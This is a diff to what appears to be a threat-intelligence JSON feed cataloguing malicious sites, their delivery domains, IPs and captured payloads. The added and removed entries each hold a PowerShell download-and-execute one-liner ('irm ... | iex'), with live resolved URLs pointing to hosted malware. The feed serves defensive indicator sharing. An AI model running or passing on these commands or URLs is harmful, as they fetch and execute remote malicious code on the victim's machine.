@@ -1,5 +1,22 @@
 [
   {
+    "UrlDomain": "ustkanrdk.ru",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "91.236.136.63"
+    ],
+    "Related": [],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmwg9lbgo0l4u0omlslp8xa75",
+    "ScannedAt": "2026-11-14T10:30:14.635000+00:00"
+  },
+  {
     "UrlDomain": "nmengineering.co.za",
     "DeliveryUrl": [
       "github.pw"
@@ -2099,24 +2116,5 @@
     ],
     "ReportId": "cmwdguwhj03zw0omlnorqrh3r",
     "ScannedAt": "2026-11-12T11:30:20.446000+00:00"
-  },
-  {
-    "UrlDomain": "thejoints.shop",
-    "DeliveryUrl": [
-      "nexguard.pro"
-    ],
-    "PayloadUrl": [
-      "https://nexguard.pro/Girya/ff9a9c33c814a1a4"
-    ],
-    "IP": [
-      "50.6.138.145"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://nexguard[.]pro/Girya/ff9a9c33c814a1a4')|iex",
-    "ResolvedDownloadUrl": [
-      "https://nexguard.pro/Girya/ff9a9c33c814a1a4"
-    ],
-    "ReportId": "cmwdfg5is03uq0oml2mt1nbdk",
-    "ScannedAt": "2026-11-12T10:50:52.751000+00:00"
   }
 ]
